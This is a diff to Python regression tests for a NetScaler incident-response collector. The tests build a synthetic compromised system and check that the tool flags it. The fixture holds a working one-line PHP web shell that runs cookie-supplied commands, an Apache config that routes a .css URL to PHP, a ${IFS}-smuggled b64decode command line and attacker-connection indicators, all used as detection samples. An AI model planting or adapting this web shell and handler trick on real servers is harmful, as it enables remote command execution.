@@ -41,7 +41,7 @@ def binary(root, name):
                 shutil.copy2(token, dest)
 
 class Fixture:
-    def __init__(self, fault='', indicators=False):
+    def __init__(self, fault='', indicators=False, incident_chain=False):
         self.tmp = tempfile.TemporaryDirectory(prefix='nsir-regression-')
         self.root = root = Path(self.tmp.name)
         for d in ['sbin', 'usr/bin', 'usr/sbin', 'usr/local/bin', 'usr/local/sbin',
@@ -91,6 +91,55 @@ class Fixture:
             put(root, '/netscaler/ns_gui/fake.png', 'not an image\n')
             with (root/'var/log/ns.log').open('ab') as f:
                 f.write(b'AAA Message Authentication is rejected for user\x80\n')
+        if incident_chain:
+            put(root, '/sbin/ps', '''#!/bin/sh
+case "$*" in
+  *pid,ppid,user,command*)
+    echo "PID PPID USER COMMAND"
+    echo "200 1 root /netscaler/ns_monuploadd_err.pl -WR /var/log/htt/stage"
+    echo '201 200 nobody /bin/sh -c b64decode${IFS}/var/log/htt/stage'
+    ;;
+  *user,pid,ppid,comm*)
+    echo "USER PID PPID COMM"
+    echo "root 200 1 ns_monuploadd_err.pl"
+    echo "nobody 201 200 sh"
+    ;;
+  *)
+    echo "USER PID PPID COMM"
+    echo "root 1 0 /sbin/init"
+    ;;
+esac
+''', 0o755)
+            put(root, '/sbin/sockstat', '#!/bin/sh\necho "root proc 200 7 tcp4 192.0.2.10:1234 203.0.113.99:443"\n', 0o755)
+            put(root, '/sbin/nscli', '''#!/bin/sh
+case "$*" in
+  *"show ns tcpparam"*) echo "Enhanced ISN Generation: ENABLED";;
+  *) echo "NetScaler NS14.1 Build 73.30 synthetic fixture";;
+esac
+''', 0o755)
+            put(root, '/etc/httpd.conf', '''AddHandler application/x-httpd-php .php .shtml
+php_flag engine on
+<FilesMatch "\\.css$">
+SetHandler application/x-httpd-php
+</FilesMatch>
+Alias /vpn/theme/receiver.min.css /var/netscaler/.ctxs.receiver
+''')
+            put(root, '/flash/nsconfig/httpd.conf', 'AddHandler application/x-httpd-php .php .ctxs\n')
+            put(root, '/var/netscaler/.ctxs.receiver', '<?php passthru($_COOKIE["c"]); ?>\n')
+            with (root/'flash/nsconfig/ns.conf').open('a') as f:
+                f.write('add vpn vserver gw SSL 192.0.2.10 443 -dtls ON\n')
+                f.write('add lb vserver web HTTP 192.0.2.20 80\n')
+                f.write('add lb vserver db ORACLE 192.0.2.21 1521\n')
+                f.write('add lb vserver file FTP 192.0.2.22 21\n')
+                f.write('add lb vserver dns DNS 192.0.2.23 53 -dns64 ENABLED\n')
+                f.write('add lsn group nat64-group -nattype NAT64\n')
+            put(root, '/var/log/messages', 'pitboss PPE missed too many heartbeats and NSPPE unexpectedly died\n'
+                'ns_monuploadd_err.pl -WR ${IFS} b64decode /var/log/htt/stage\n')
+            put(root, '/var/log/nsvpn.log', 'outbound connection to 203.0.113.99\n')
+            put(root, '/var/log/httpaccess-vpn.log',
+                'GET /vpn/theme/receiver.min.css HTTP/1.1 User-Agent: '+('A'*96)+'\n')
+            put(root, '/var/log/httperror.log', 'received SIGHUP, graceful restart\n')
+            put(root, '/tmp/runtime-iocs.txt', '# runtime-only\n203.0.113.99\n2001:db8::99\n')
         if fault in ('archive', 'evidence', 'corrupt'):
             match = '-cf' if fault == 'evidence' else '-czf'
             action = 'printf bad > "$2"; exit 0' if fault == 'corrupt' else 'exit 2'
@@ -162,8 +211,8 @@ class Fixture:
     def close(self): self.tmp.cleanup()
 
 class CollectorTests(unittest.TestCase):
-    def fixture(self, fault='', indicators=False):
-        f=Fixture(fault, indicators); f.label=self.id().split('.')[-1]
+    def fixture(self, fault='', indicators=False, incident_chain=False):
+        f=Fixture(fault, indicators, incident_chain); f.label=self.id().split('.')[-1]
         self.addCleanup(f.close); return f
 
     def test_default_privacy_and_archive(self):
@@ -253,6 +302,62 @@ class CollectorTests(unittest.TestCase):
 
     def test_keep_staging(self):
         f=self.fixture(); self.assertEqual(f.run('-k'),0,f.result.stderr); self.assertTrue(f.staging)
+
+    def test_incident_chain_coverage_default_is_aggregate_only(self):
+        f=self.fixture(incident_chain=True)
+        self.assertEqual(f.run('-i','/tmp/runtime-iocs.txt'),0,f.result.stderr)
+        d=f.records[0]['data']
+        self.assertNotIn(b'203.0.113.99',d['checks/ioc_active_connection_hits.txt'])
+        self.assertNotIn(b'203.0.113.99',d['logs_analysis/ioc_log_hits.txt'])
+        self.assertNotIn(b'203.0.113.99',d['00_TRIAGE_FLAGS.txt'])
+        self.assertEqual(d['checks/procs_monuploadd_wr.txt'],b'matching_lines=1\n')
+        self.assertEqual(d['checks/procs_wr_descendant_shells.txt'],b'matching_lines=1\n')
+        self.assertEqual(d['checks/ioc_active_connection_hits.txt'],b'matching_lines=1\n')
+        self.assertEqual(d['logs_analysis/ioc_log_hits.txt'],b'matching_lines=1\n')
+        self.assertEqual(d['logs_analysis/nsppe_parser_crash_chain.txt'],b'matching_lines=1\n')
+        self.assertEqual(d['logs_analysis/command_stage_markers.txt'],b'matching_lines=1\n')
+        self.assertEqual(d['logs_analysis/http_css_receiver_requests.txt'],b'matching_lines=1\n')
+        self.assertEqual(d['logs_analysis/http_base64_user_agents.txt'],b'matching_lines=1\n')
+        self.assertEqual(d['logs_analysis/httpd_reload_indicators.txt'],b'matching_lines=1\n')
+        self.assertIn(b'/etc/httpd.conf:',d['checks/httpd_conf_php_engine_on.txt'])
+        self.assertIn(b'/flash/nsconfig/httpd.conf:',d['checks/httpd_conf_php_extensions.txt'])
+        self.assertIn(b'non-PHP Files block',d['checks/httpd_conf_files_php_handler.txt'])
+        self.assertIn(b'static-looking URL',d['checks/httpd_conf_static_aliases.txt'])
+        self.assertIn(b'/etc/httpd.conf|/flash/nsconfig/httpd.conf',d['checks/httpd_conf_live_persistent_differences.txt'])
+        self.assertIn(b'enhanced_isn_enabled_lines=1',d['checks/tcpparam_precondition.txt'])
+        self.assertIn(b'dtls_enabled_entries=1',d['checks/cve_precondition_summary.txt'])
+        self.assertIn(b'oracle_entries=1',d['checks/cve_precondition_summary.txt'])
+        self.assertIn(b'ftp_entries=1',d['checks/cve_precondition_summary.txt'])
+        self.assertIn(b'dns64_entries=1',d['checks/cve_precondition_summary.txt'])
+        self.assertIn(b'nat64_entries=1',d['checks/cve_precondition_summary.txt'])
+        self.assertIn(b'/var/log/httpaccess-vpn.log',d['logs_analysis/log_coverage.txt'])
+        self.assertIn(b'/var/log/nsvpn.log',d['logs_analysis/log_coverage.txt'])
+
+    def test_incident_chain_coverage_sensitive_copies_configs_and_raw_matches(self):
+        f=self.fixture(incident_chain=True)
+        self.assertEqual(f.run('-S','-i','/tmp/runtime-iocs.txt'),0,f.result.stderr)
+        d=f.records[0]['data']
+        self.assertIn(b'203.0.113.99',d['logs_analysis/ioc_log_hits.txt'])
+        with tarfile.open(fileobj=io.BytesIO(d['files/evidence_files.tar'])) as t:
+            names=t.getnames()
+            self.assertIn('etc/httpd.conf',names)
+            self.assertIn('flash/nsconfig/httpd.conf',names)
+            self.assertNotIn('tmp/runtime-iocs.txt',names)
+
+    def test_invalid_runtime_ioc_file_is_fatal(self):
+        f=self.fixture(); put(f.root,'/tmp/bad-iocs.txt','192.0.2.1\nnot-an-ip\n')
+        self.assertEqual(f.run('-i','/tmp/bad-iocs.txt'),1)
+        self.assertTrue(f.staging); self.assertFalse(f.records)
+
+    def test_alternate_php_extension_alone_is_not_high(self):
+        f=self.fixture()
+        put(f.root,'/etc/httpd.conf','AddHandler application/x-httpd-php .php .shtml\n')
+        put(f.root,'/var/log/messages','pitboss PPE missed too many heartbeats and NSPPE unexpectedly died\n')
+        put(f.root,'/var/log/httperror.log','received SIGHUP, graceful restart\n')
+        self.assertEqual(f.run(),0,f.result.stderr)
+        flags=f.records[0]['data']['00_TRIAGE_FLAGS.txt']
+        self.assertIn(b'[MEDIUM] HTTP configuration maps PHP handler to alternate extensions',flags)
+        self.assertNotIn(b'[HIGH]',flags)
 
 
     def support_fixture(self, behavior='success'):
